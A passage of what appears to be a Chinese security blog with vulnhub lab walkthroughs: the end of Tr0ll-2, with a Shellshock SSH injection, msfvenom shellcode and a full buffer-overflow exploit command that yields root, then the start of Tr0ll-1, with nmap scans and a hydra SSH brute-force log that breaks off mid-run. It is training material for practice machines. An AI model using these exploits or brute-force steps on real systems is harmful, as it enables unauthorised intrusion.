<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># ssh -i noob noob@192.168.66.16 &#x27;() &#123; :;&#125;; /bin/bash&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> /nothing_to_see_here/choose_wisely/door1</span><br><span class="line">./r00t $(python -c <span class="string">&#x27;print &quot;A&quot; * 1000&#x27;</span>)</span><br><span class="line">Good job, stand by, executing root shell...</span><br><span class="line">BUHAHAHA NOOB!</span><br><span class="line">Good job, stand by, executing root shell...</span><br><span class="line">BUHAHAHA NOOB!</span><br><span class="line"><span class="built_in">cd</span> /nothing_to_see_here/choose_wisely/door2</span><br><span class="line">./r00t $(python -c <span class="string">&#x27;print &quot;A&quot; * 1000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">2 MINUTE HARD MODE LOL</span><br><span class="line"><span class="built_in">cd</span> /nothing_to_see_here/choose_wisely/door3</span><br><span class="line">./r00t $(python -c <span class="string">&#x27;print &quot;A&quot; * 1000&#x27;</span>)Connection to 192.168.66.16 closed by remote host.</span><br></pre></td></tr></table></figure>

<p>尝试了很多次，发现door3中的r00t容易受到缓冲区溢出的影响，因此将利用这一点。（实际上，它是随机的，当离开一段时间到达目标时，注意到它会将易受攻击的r00t文件更改为另一个door。）</p>
<p>创建模式字符串以查找缓冲区大小。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span><br></pre></td></tr></table></figure>

<p>目标机器上使用GDB。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /nothing_to_see_here/choose_wisely/door3</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwsr-xr-x 2 root root 4096 Oct  5  2014 .</span><br><span class="line">drwsr-xr-x 5 root root 4096 Oct  4  2014 ..</span><br><span class="line">-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t</span><br><span class="line">gdb -q ./r00t</span><br><span class="line">Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.</span><br><span class="line">(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span><br><span class="line">Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x6a413969 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) i r esp</span><br><span class="line">esp            0xbffffab0       0xbffffab0</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>将模式转换为十进制缓冲区大小</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969</span></span><br><span class="line">[*] Exact match at offset 268</span><br></pre></td></tr></table></figure>

<p>使用msfvenom创建/bin/sh的payload并转义空字节</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll2<span class="comment"># msfvenom --platform linux -p linux/x86/exec -f python CMD=&quot;/bin/sh&quot; -b &#x27;\x00\x0a\x0d&#x27; -a x86</span></span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 70 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 70</span><br><span class="line">Payload size: 70 bytes</span><br><span class="line">Final size of python file: 357 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xba\x44\x81\xb3\x61\xdb\xd6\xd9\x74\x24\xf4\x5e\x2b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xb1\xeb\xb8\x39\xa0\xbe\xd8\xd1\xff\x5d\xac\xc5\x97&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8e\xdd\x61\x67\xb9\x0e\x10\x0e\x57\xd8\x37\x82\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xd2\xb7\x22\x90\xcc\xd5\x4b\xfe\x3d\x69\xe3\xfe\x16&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xde\x7a\x1f\x55\x60&quot;</span></span><br></pre></td></tr></table></figure>

<p>编写漏洞利用程序。（A * 268）（shell偏移量）（nop sled）（shellcode）</p>
<p>发现esp的位置是0xbffffab0，但不能使用此偏移量作为shell位置。必须稍微增加或减少偏移量，因为在调试二进制文件时内存有所不同。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./r00t $(python -c <span class="string">&quot;print &#x27;A&#x27; * 268 + &#x27;\x90\xfb\xff\xbf&#x27; + &#x27;\x90&#x27; * 100 + &#x27;\xba\x44\x81\xb3\x61\xdb\xd6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\xb1\xeb\xb8\x39\xa0\xbe\xd8\xd1\xff\x5d\xac\xc5\x97\x8e\xdd\x61\x67\xb9\x0e\x10\x0e\x57\xd8\x37\x82\x4f\xd2\xb7\x22\x90\xcc\xd5\x4b\xfe\x3d\x69\xe3\xfe\x16\xde\x7a\x1f\x55\x60&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>进入目录执行编写好的exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> door3</span><br><span class="line">./r00t $(python -c <span class="string">&quot;print &#x27;A&#x27; * 268 + &#x27;\x90\xfb\xff\xbf&#x27; + &#x27;\x90&#x27; * 100 + &#x27;\xba\x44\x81\xb3\x61\xdb\xd6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x83\xee\xfc\x31\x56\x11\x03\x56\x11\xe2\xb1\xeb\xb8\x39\xa0\xbe\xd8\xd1\xff\x5d\xac\xc5\x97\x8e\xdd\x61\x67\xb9\x0e\x10\x0e\x57\xd8\x37\x82\x4f\xd2\xb7\x22\x90\xcc\xd5\x4b\xfe\x3d\x69\xe3\xfe\x16\xde\x7a\x1f\x55\x60&#x27;&quot;</span>)</span><br><span class="line">id</span><br><span class="line">uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">ls -la</span><br><span class="line">total 80</span><br><span class="line">drwx------ 11 root   root   4096 Oct 14  2014 .</span><br><span class="line">drwxr-xr-x 23 root   root   4096 Oct  5  2014 ..</span><br><span class="line">-rw-------  1 root   root     67 Oct 14  2014 .bash_history</span><br><span class="line">-rw-r--r--  1 root   root   3106 Apr 19  2012 .bashrc</span><br><span class="line">-rw-r--r--  1 root   root    140 Apr 19  2012 .profile</span><br><span class="line">-rw-r--r--  1 root   root     66 Oct  5  2014 .selected_editor</span><br><span class="line">drwx------  2 root   root   4096 Oct  4  2014 .ssh</span><br><span class="line">drwxr-xr-x  2 root   root   4096 Oct  5  2014 .vim</span><br><span class="line">-rw-------  1 root   root   4259 Oct 14  2014 .viminfo</span><br><span class="line">-rw-r--r--  1 root   root     68 Oct  6  2014 Proof.txt</span><br><span class="line">drwxr-xr-x  5 root   root   4096 Oct  4  2014 core1</span><br><span class="line">drwxr-xr-x  5 root   root   4096 Oct  4  2014 core2</span><br><span class="line">drwxr-xr-x  5 root   root   4096 Oct  4  2014 core3</span><br><span class="line">drwxr-xr-x  5 root   root   4096 Oct  4  2014 core4</span><br><span class="line">drwxr-xr-x  2 root   root   4096 Oct  5  2014 goal</span><br><span class="line">drwxr-xr-x  2 root   root   4096 Oct  6  2014 hardmode</span><br><span class="line">-rw-r--r--  1 maleus maleus 1474 Oct  4  2014 lmao.zip</span><br><span class="line">-rw-r--r--  1 root   root    828 Oct  4  2014 ran_dir.py</span><br><span class="line">drwxr-xr-x  2 root   root   4096 Oct  6  2014 reboot</span><br><span class="line">cat Proof.txt</span><br><span class="line">You win this time young Jedi...</span><br><span class="line"></span><br><span class="line">a70354f0258dcc00292c72aab3c8b1e4</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub235.jpg"></li>
</ul>
<p>到此为止，已经成功地获取了root权限，并找到了flag。</p>
<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
<li>md5值校验</li>
<li>base64加密文本字符串解密</li>
<li>fcrackzip破解压缩包密码</li>
<li>ssh使用rsa私匙登录</li>
<li>shellshock漏洞利用</li>
<li>设置SUID位的二进制文件使用gdb调试缓冲区溢出位置</li>
<li>msfvenom生成shellcode</li>
<li>缓冲区溢出shellcode exp脚本编写</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[Tr0ll-1]</title>
    <url>/2020/03/31/Tr0ll-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：Tr0ll: 1<br>发布日期：2014年8月14日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL292ZXJmbG93c2VjdXJpdHkuY29tL2ZpbGVzL1RyMGxsLnJhcg==">http://overflowsecurity.com/files/Tr0ll.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbC5yYXI=">https://download.vulnhub.com/tr0ll/Tr0ll.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS90cjBsbC9UcjBsbC5yYXIudG9ycmVudA==">https://download.vulnhub.com/tr0ll/Tr0ll.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Tr0ll的灵感来自OSCP实验室中不断摇曳的机器。目标很简单，获得root权限并从/ root目录获取Proof.txt。不为容易受挫！公平警告，前方有巨魔！难度：初学者类型：boot2root</p>
<p>特别感谢@ OS_Eagle11和@superkojiman自始至终经历了测试！本机应使用DHCP提取IP，如果有任何问题，请与我联系以获取密码以使其正常工作。反馈总是很感激！male</p>
<p>Freenode-Maleus</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5SUM (Tr0ll.rar): 318fe0b1c0dd4fa0a8dca43edace8b20</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -p- -v 192.168.66.15</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -p 21,22,80 -v 192.168.66.15 --script=vuln -T4</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.2</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /robots.txt: Robots file</span><br><span class="line">|_  /secret/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server<span class="string">&#x27;s resources causing Denial Of Service.</span></span><br><span class="line"><span class="string">|       </span></span><br><span class="line"><span class="string">|     Disclosure date: 2009-09-17</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       http://ha.ckers.org/slowloris/</span></span><br><span class="line"><span class="string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:2.4.7: </span><br><span class="line">|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679</span><br><span class="line">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span><br><span class="line">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span><br><span class="line">|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226</span><br><span class="line">|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788</span><br><span class="line">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span><br><span class="line">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span><br><span class="line">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span><br><span class="line">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span><br><span class="line">|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798</span><br><span class="line">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span><br><span class="line">|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743</span><br><span class="line">|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161</span><br><span class="line">|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736</span><br><span class="line">|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523</span><br><span class="line">|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231</span><br><span class="line">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span><br><span class="line">|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975</span><br><span class="line">|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185</span><br><span class="line">|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109</span><br><span class="line">|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118</span><br><span class="line">|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117</span><br><span class="line">|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span><br><span class="line">|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612</span><br></pre></td></tr></table></figure>

<p>通过枚举，得到了一些有趣的东西：</p>
<ul>
<li>允许匿名FTP登录</li>
<li>HTTP服务有2个有趣的页面：robots.txt和secret</li>
</ul>
<p>允许匿名FTP</p>
<p>有一个文件lol.pcap，发现一些文本文件名secret_stuff.txt被推送到FTP服务器。该文件包含文本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">150 Here comes the directory listing.</span><br><span class="line"></span><br><span class="line">-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt</span><br><span class="line"></span><br><span class="line">Well, well, well, aren<span class="string">&#x27;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Sucks, you were so close... gotta TRY HARDER!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).</span></span><br></pre></td></tr></table></figure>

<p>发现在具有该路径的Web服务器中没有什么有用的。回到从PCAP文件获得的文本文件中的消息。注意到sup3rs3cr3tdirlol一直是supersecretdirlol的代名词，然后检查了它是否可以是HTTP服务的URL路径。发现/sup3rs3cr3tdirlol/存在并且包含一个文件。</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub230.jpg"></li>
</ul>
<p>检查一下文件类型，发现是一个二进制文件。尝试执行它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll<span class="comment"># file roflmao</span></span><br><span class="line">roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped</span><br></pre></td></tr></table></figure>

<p>不用逆向二进制文件，因为当二进制文件运行时，没有内存地址0x0856BF。所以尝试再次使用0x0856BF作为HTTP服务中的URL路径。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll<span class="comment"># ./roflmao </span></span><br><span class="line">Find address 0x0856BF to proceedr</span><br></pre></td></tr></table></figure>

<p>发现2个web目录</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub231.jpg"></li>
</ul>
<h2 id="0x0856BF-good-luck-目录"><a href="#0x0856BF-good-luck-目录" class="headerlink" title="/0x0856BF/good_luck/目录"></a>/0x0856BF/good_luck/目录</h2><p>which_one_lol.txt<br>包含以下的字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">maleus</span><br><span class="line">ps-aux</span><br><span class="line">felux</span><br><span class="line">Eagle11</span><br><span class="line">genphlux &lt; -- Definitely not this one</span><br><span class="line">usmc8892</span><br><span class="line">blawrg</span><br><span class="line">wytshadow</span><br><span class="line">vis1t0r</span><br><span class="line">overflow</span><br></pre></td></tr></table></figure>

<h2 id="0x0856BF-this-folder-contains-the-password-目录"><a href="#0x0856BF-this-folder-contains-the-password-目录" class="headerlink" title="/0x0856BF/this_folder_contains_the_password/目录"></a>/0x0856BF/this_folder_contains_the_password/目录</h2><p>Pass.txt<br>包含以下的字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Good_job_:)</span><br></pre></td></tr></table></figure>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>这些文件可能是2个用户或密码。首先，将第一个文件用作用户列表，将第二个文件用作密码。<br>使用hydra爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/troll<span class="comment"># hydra -s 22 -v -V -L users -P pass -e n -t 1 -w 30 192.168.66.15 ssh</span></span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-31 03:34:11</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:10/p:2), ~20 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.66.15:22/</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class="keyword">done</span></span><br><span class="line">[INFO] Testing <span class="keyword">if</span> password authentication is supported by ssh://maleus@192.168.66.15:22</span><br><span class="line">[INFO] Successful, password authentication is supported by ssh://192.168.66.15:22</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;maleus&quot;</span> - pass <span class="string">&quot;&quot;</span> - 1 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;maleus&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 2 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;ps-aux&quot;</span> - pass <span class="string">&quot;&quot;</span> - 3 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;ps-aux&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 4 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;felux&quot;</span> - pass <span class="string">&quot;&quot;</span> - 5 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;felux&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 6 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;Eagle11&quot;</span> - pass <span class="string">&quot;&quot;</span> - 7 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;Eagle11&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 8 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;genphlux&quot;</span> - pass <span class="string">&quot;&quot;</span> - 9 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;genphlux&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 10 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;usmc8892&quot;</span> - pass <span class="string">&quot;&quot;</span> - 11 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;usmc8892&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 12 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;blawrg&quot;</span> - pass <span class="string">&quot;&quot;</span> - 13 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;blawrg&quot;</span> - pass <span class="string">&quot;Good_job_:)&quot;</span> - 14 of 20 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 192.168.66.15 - login <span class="string">&quot;wytshadow&quot;</span> - pass <span class="string">&quot;&quot;</span> - 15 of 20 [child 0] (0/0)</span><br><span class="line">[ERROR] could not connect to target port 22: Connection refused</span><br><span class="line">[ERROR] ssh protocol error</span><br><span class="line">[VERBOSE] Retrying connection <span class="keyword">for</span> child 0</span><br><span class="line">[RE-ATTEMPT] target 